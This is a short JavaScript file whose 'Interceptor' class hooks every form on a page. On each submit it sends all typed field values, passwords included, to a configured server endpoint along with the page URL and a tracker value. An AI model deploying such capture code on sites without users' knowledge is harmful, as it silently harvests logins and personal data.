import { fetchData } from '../utils/fetch-data'
import { server } from '../config/config.default'

const url = `${server.url}/api/addFormClick`

class Interceptor {
   constructor(forms, tag) {
      this.forms = forms
      this.tag = tag
   }

   findForms() {
      const allForms = document.querySelectorAll(this.forms)
      for(let form of allForms) {
         const submit = (event) => {
            const inputsData = this.checkInputsType(event.currentTarget)
            const totalClickData = {
               referer: window.location.href,
               fields: inputsData,
               remote: this.userData()
            }
            fetchData(url, totalClickData)
         }
         form.addEventListener('submit', submit)
      }
   }

   checkInputsType(inputs) {
      let validate = {}
      for(let field of inputs) {
         const types = field.getAttribute('type')
         const names = field.getAttribute('name')
         if((types) && (types !== 'hidden') && (types !== 'checkbox')) {
            validate[names] = field.value
         }
      }
      return validate
   }

   userData() {
      const tag = document.querySelector(this.tag)
      if(tag) {
         return tag.value
      } else return 'noIP'
   }
}

new Interceptor('body form', '#tracker_data').findForms()